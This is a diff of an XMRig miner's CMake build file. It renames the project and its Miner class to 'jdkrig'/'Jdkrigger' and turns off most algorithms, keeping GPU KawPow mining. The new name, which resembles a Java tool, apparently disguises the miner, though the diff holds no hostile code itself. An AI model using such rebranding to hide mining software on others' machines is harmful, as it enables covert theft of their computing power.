@@ -1,37 +1,37 @@
 cmake_minimum_required(VERSION 3.5)
-project(xmrig)
+project(jdkrig)
 
-option(WITH_HWLOC           "Enable hwloc support" ON)
-option(WITH_CN_LITE         "Enable CryptoNight-Lite algorithms family" ON)
-option(WITH_CN_HEAVY        "Enable CryptoNight-Heavy algorithms family" ON)
-option(WITH_CN_PICO         "Enable CryptoNight-Pico algorithm" ON)
-option(WITH_CN_FEMTO        "Enable CryptoNight-UPX2 algorithm" ON)
-option(WITH_RANDOMX         "Enable RandomX algorithms family" ON)
-option(WITH_ARGON2          "Enable Argon2 algorithms family" ON)
+option(WITH_HWLOC           "Enable hwloc support" OFF)
+option(WITH_CN_LITE         "Enable CryptoNight-Lite algorithms family" OFF)
+option(WITH_CN_HEAVY        "Enable CryptoNight-Heavy algorithms family" OFF)
+option(WITH_CN_PICO         "Enable CryptoNight-Pico algorithm" OFF)
+option(WITH_CN_FEMTO        "Enable CryptoNight-UPX2 algorithm" OFF)
+option(WITH_RANDOMX         "Enable RandomX algorithms family" OFF)
+option(WITH_ARGON2          "Enable Argon2 algorithms family" OFF)
 option(WITH_KAWPOW          "Enable KawPow algorithms family" ON)
-option(WITH_GHOSTRIDER      "Enable GhostRider algorithm" ON)
+option(WITH_GHOSTRIDER      "Enable GhostRider algorithm" OFF)
 option(WITH_HTTP            "Enable HTTP protocol support (client/server)" ON)
 option(WITH_DEBUG_LOG       "Enable debug log output" OFF)
 option(WITH_TLS             "Enable OpenSSL support" ON)
 option(WITH_ASM             "Enable ASM PoW implementations" ON)
-option(WITH_MSR             "Enable MSR mod & 1st-gen Ryzen fix" ON)
-option(WITH_ENV_VARS        "Enable environment variables support in config file" ON)
+option(WITH_MSR             "Enable MSR mod & 1st-gen Ryzen fix" OFF)
+option(WITH_ENV_VARS        "Enable environment variables support in config file" OFF)
 option(WITH_EMBEDDED_CONFIG "Enable internal embedded JSON config" OFF)
 option(WITH_OPENCL          "Enable OpenCL backend" ON)
 set(WITH_OPENCL_VERSION 200 CACHE STRING "Target OpenCL version")
 set_property(CACHE WITH_OPENCL_VERSION PROPERTY STRINGS 120 200 210 220)
 option(WITH_CUDA            "Enable CUDA backend" ON)
-option(WITH_NVML            "Enable NVML (NVIDIA Management Library) support (only if CUDA backend enabled)" ON)
-option(WITH_ADL             "Enable ADL (AMD Display Library) or sysfs support (only if OpenCL backend enabled)" ON)
-option(WITH_STRICT_CACHE    "Enable strict checks for OpenCL cache" ON)
+option(WITH_NVML            "Enable NVML (NVIDIA Management Library) support (only if CUDA backend enabled)" OFF)
+option(WITH_ADL             "Enable ADL (AMD Display Library) or sysfs support (only if OpenCL backend enabled)" OFF)
+option(WITH_STRICT_CACHE    "Enable strict checks for OpenCL cache" OFF)
 option(WITH_INTERLEAVE_DEBUG_LOG "Enable debug log for threads interleave" OFF)
 option(WITH_PROFILING       "Enable profiling for developers" OFF)
-option(WITH_SSE4_1          "Enable SSE 4.1 for Blake2" ON)
-option(WITH_AVX2            "Enable AVX2 for Blake2" ON)
-option(WITH_VAES            "Enable VAES instructions for Cryptonight" ON)
-option(WITH_BENCHMARK       "Enable builtin RandomX benchmark and stress test" ON)
-option(WITH_SECURE_JIT      "Enable secure access to JIT memory" OFF)
-option(WITH_DMI             "Enable DMI/SMBIOS reader" ON)
+option(WITH_SSE4_1          "Enable SSE 4.1 for Blake2" OFF)
+option(WITH_AVX2            "Enable AVX2 for Blake2" OFF)
+option(WITH_VAES            "Enable VAES instructions for Cryptonight" OFF)
+option(WITH_BENCHMARK       "Enable builtin RandomX benchmark and stress test" OFF)
+option(WITH_SECURE_JIT      "Enable secure access to JIT memory" ON)
+option(WITH_DMI             "Enable DMI/SMBIOS reader" OFF)
 
 option(BUILD_STATIC         "Build static binary" OFF)
 option(ARM_V8               "Force ARMv8 (64 bit) architecture, use with caution if automatic detection fails, but you sure it may work" OFF)
@@ -60,7 +60,7 @@ set(HEADERS
     src/core/config/ConfigTransform.h
     src/core/config/usage.h
     src/core/Controller.h
-    src/core/Miner.h
+    src/core/Jdkrigger.h
     src/core/Taskbar.h
     src/net/interfaces/IJobResultListener.h
     src/net/JobResult.h
@@ -95,7 +95,7 @@ set(HEADERS_CRYPTO
     src/crypto/common/VirtualMemory.h
    )
 
-if (XMRIG_ARM)
+if (JDKRIG_ARM)
     set(HEADERS_CRYPTO "${HEADERS_CRYPTO}" src/crypto/cn/CryptoNight_arm.h)
 else()
     set(HEADERS_CRYPTO "${HEADERS_CRYPTO}" src/crypto/cn/CryptoNight_x86.h)
@@ -109,13 +109,13 @@ set(SOURCES
     src/core/config/Config.cpp
     src/core/config/ConfigTransform.cpp
     src/core/Controller.cpp
-    src/core/Miner.cpp
+    src/core/Jdkrigger.cpp
     src/core/Taskbar.cpp
     src/net/JobResults.cpp
     src/net/Network.cpp
     src/net/strategies/DonateStrategy.cpp
     src/Summary.cpp
-    src/xmrig.cpp
+    src/jdkrig.cpp
    )
 
 set(SOURCES_CRYPTO
@@ -136,7 +136,7 @@ if (CMAKE_C_COMPILER_ID MATCHES GNU)
 endif()
 
 if (WITH_VAES)
-    add_definitions(-DXMRIG_VAES)
+    add_definitions(-DJDKRIG_VAES)
     set(HEADERS_CRYPTO "${HEADERS_CRYPTO}" src/crypto/cn/CryptoNight_x86_vaes.h)
     set(SOURCES_CRYPTO "${SOURCES_CRYPTO}" src/crypto/cn/CryptoNight_x86_vaes.cpp)
     if (CMAKE_C_COMPILER_ID MATCHES GNU OR CMAKE_C_COMPILER_ID MATCHES Clang)
@@ -155,7 +155,7 @@ if (WITH_HWLOC)
         )
 endif()
 
-if (XMRIG_OS_WIN)
+if (JDKRIG_OS_WIN)
     list(APPEND SOURCES_OS
         res/app.rc
         src/App_win.cpp
@@ -163,7 +163,7 @@ if (XMRIG_OS_WIN)
         )
 
     set(EXTRA_LIBS ws2_32 psapi iphlpapi userenv dbghelp)
-elseif (XMRIG_OS_APPLE)
+elseif (JDKRIG_OS_APPLE)
     list(APPEND SOURCES_OS
         src/App_unix.cpp
         src/crypto/common/VirtualMemory_unix.cpp
@@ -178,21 +178,21 @@ else()
         src/crypto/common/VirtualMemory_unix.cpp
         )
 
-    if (XMRIG_OS_ANDROID)
+    if (JDKRIG_OS_ANDROID)
         set(EXTRA_LIBS pthread rt dl log)
-    elseif (XMRIG_OS_LINUX)
+    elseif (JDKRIG_OS_LINUX)
         list(APPEND SOURCES_OS
             src/crypto/common/LinuxMemory.h
             src/crypto/common/LinuxMemory.cpp
             )
 
         set(EXTRA_LIBS pthread rt dl)
-    elseif (XMRIG_OS_FREEBSD)
+    elseif (JDKRIG_OS_FREEBSD)
         set(EXTRA_LIBS kvm pthread)
     endif()
 endif()
 
-add_definitions(-DXMRIG_MINER_PROJECT -DXMRIG_JSON_SINGLE_LINE_ARRAY)
+add_definitions(-DJDKRIG_JDKRIGGER_PROJECT -DJDKRIG_JSON_SINGLE_LINE_ARRAY)
 add_definitions(-D__STDC_FORMAT_MACROS -DUNICODE -D_FILE_OFFSET_BITS=64)
 
 find_package(UV REQUIRED)
@@ -206,23 +206,23 @@ include(cmake/OpenSSL.cmake)
 include(cmake/asm.cmake)
 
 if (WITH_CN_LITE)
-    add_definitions(/DXMRIG_ALGO_CN_LITE)
+    add_definitions(/DJDKRIG_ALGO_CN_LITE)
 endif()
 
 if (WITH_CN_HEAVY)
-    add_definitions(/DXMRIG_ALGO_CN_HEAVY)
+    add_definitions(/DJDKRIG_ALGO_CN_HEAVY)
 endif()
 
 if (WITH_CN_PICO)
-    add_definitions(/DXMRIG_ALGO_CN_PICO)
+    add_definitions(/DJDKRIG_ALGO_CN_PICO)
 endif()
 
 if (WITH_CN_FEMTO)
-    add_definitions(/DXMRIG_ALGO_CN_FEMTO)
+    add_definitions(/DJDKRIG_ALGO_CN_FEMTO)
 endif()
 
 if (WITH_EMBEDDED_CONFIG)
-    add_definitions(/DXMRIG_FEATURE_EMBEDDED_CONFIG)
+    add_definitions(/DJDKRIG_FEATURE_EMBEDDED_CONFIG)
 endif()
 
 include(src/hw/api/api.cmake)
@@ -236,8 +236,8 @@ if (WITH_DEBUG_LOG)
     add_definitions(/DAPP_DEBUG)
 endif()
 
-add_executable(${CMAKE_PROJECT_NAME} ${HEADERS} ${SOURCES} ${SOURCES_OS} ${HEADERS_CRYPTO} ${SOURCES_CRYPTO} ${SOURCES_SYSLOG} ${TLS_SOURCES} ${XMRIG_ASM_SOURCES})
-target_link_libraries(${CMAKE_PROJECT_NAME} ${XMRIG_ASM_LIBRARY} ${OPENSSL_LIBRARIES} ${UV_LIBRARIES} ${EXTRA_LIBS} ${CPUID_LIB} ${ARGON2_LIBRARY} ${ETHASH_LIBRARY} ${GHOSTRIDER_LIBRARY})
+add_executable(${CMAKE_PROJECT_NAME} ${HEADERS} ${SOURCES} ${SOURCES_OS} ${HEADERS_CRYPTO} ${SOURCES_CRYPTO} ${SOURCES_SYSLOG} ${TLS_SOURCES} ${JDKRIG_ASM_SOURCES})
+target_link_libraries(${CMAKE_PROJECT_NAME} ${JDKRIG_ASM_LIBRARY} ${OPENSSL_LIBRARIES} ${UV_LIBRARIES} ${EXTRA_LIBS} ${CPUID_LIB} ${ARGON2_LIBRARY} ${ETHASH_LIBRARY} ${GHOSTRIDER_LIBRARY})
 
 if (WIN32)
     add_custom_command(TARGET ${CMAKE_PROJECT_NAME} POST_BUILD COMMAND ${CMAKE_COMMAND} -E copy_if_different "${CMAKE_SOURCE_DIR}/bin/WinRing0/WinRing0x64.sys" $<TARGET_FILE_DIR:${CMAKE_PROJECT_NAME}>)
